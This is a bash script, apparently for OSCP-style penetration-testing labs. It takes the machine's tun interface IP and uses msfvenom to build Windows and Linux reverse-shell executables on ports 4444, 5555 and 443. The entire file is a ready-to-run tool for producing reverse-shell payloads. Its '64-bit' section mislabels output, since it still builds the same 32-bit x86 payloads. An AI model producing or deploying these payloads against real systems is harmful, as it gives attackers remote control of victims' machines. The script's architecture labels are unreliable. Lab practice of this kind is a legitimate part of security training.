#!/bin/bash

RED="\e[31m"
GREEN="\e[32m"
YLW="\e[33m"
ENDC="\e[0m"


oscpip=`ip a | egrep -o "([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}).*tun" | egrep -o "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"`

ports=(4444 5555 443)

echo $oscpip > ip.txt

# 32-bit payloads
for PORT in ${ports[@]}
do 
    echo -e $GREEN"\n\nCreating windows 32-bit reverse shell for IP: $YLW $oscpip$GREEN on port$YLW $PORT$GREEN..."$ENDC
    msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=$oscpip LPORT=$PORT -f exe -o reverse_x86_$PORT.exe

    echo -e $GREEN"\n\nCreating linux 32-bit reverse shell for IP: $YLW $oscpip$GREEN on port$YLW $PORT$GREEN..."$ENDC
    msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=$oscpip LPORT=$PORT -f elf -o reverse_x86_$PORT

done

# 64-bit payloads
for PORT in ${ports[@]}
do 
    echo -e $GREEN"\n\nCreating windows 64-bit reverse shell for IP: $YLW $oscpip$GREEN on port$YLW $PORT$GREEN..."$ENDC
    msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=$oscpip LPORT=$PORT -f exe -o reverse_$PORT.exe

    echo -e $GREEN"\n\nCreating linux 64-bit reverse shell for IP: $YLW $oscpip$GREEN on port$YLW $PORT$GREEN..."$ENDC
    msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=$oscpip LPORT=$PORT -f elf -o reverse_$PORT

done


